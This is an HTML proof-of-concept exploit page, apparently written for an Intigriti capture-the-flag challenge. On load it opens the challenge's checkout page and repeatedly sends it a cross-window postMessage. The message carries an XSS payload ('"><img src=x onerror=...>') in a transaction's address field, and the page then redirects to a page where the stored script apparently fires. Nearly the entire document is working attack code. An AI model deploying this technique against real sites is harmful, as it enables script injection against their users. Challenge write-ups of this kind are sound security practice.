<!DOCTYPE html>
<html>
<head>
    <title>PoC</title>
</head>
<body>
    <h2>Exploit Running...</h2>
    <div id="status">Initializing...</div>
    <button onclick="startExploit()">Click me</button>

    <script>
        const targetUrl = "https://challenge-0126.intigriti.io/checkout.html";
        const marketWatchUrl = "https://challenge-0126.intigriti.io/marketwatch.html";

        function log(msg) {
            document.getElementById("status").innerText = msg;
            console.log(msg);
        }

        function startExploit() {
            log("Opening target window...");

            var win = window.open(targetUrl, "targetWindow");

            const xssPayload = "0x\"><img src=x onerror=alert(document.domain)>";

            const message = {
                type: "submitTransaction",
                transaction: {
                    currency: "1337COIN",
                    amount: 0.00000001, 
                    toAddress: xssPayload
                }
            };

            let counter = 0;
            const interval = setInterval(() => {
                try {
                    win.postMessage(message, "*");
                    log(`Message sent (Attempt ${++counter})...`);
                    
                    if (counter > 20) {
                        clearInterval(interval);
                        log("Exploit phase complete. Redirecting to check result...");
                        
                        setTimeout(() => {
                            win.location.href = marketWatchUrl;
                        }, 1000);
                    }
                } catch (e) {
                    console.error(e);
                }
            }, 500);
        }

        window.onload = function() {
            setTimeout(startExploit, 1000);
        }
    </script>
</body>
</html>
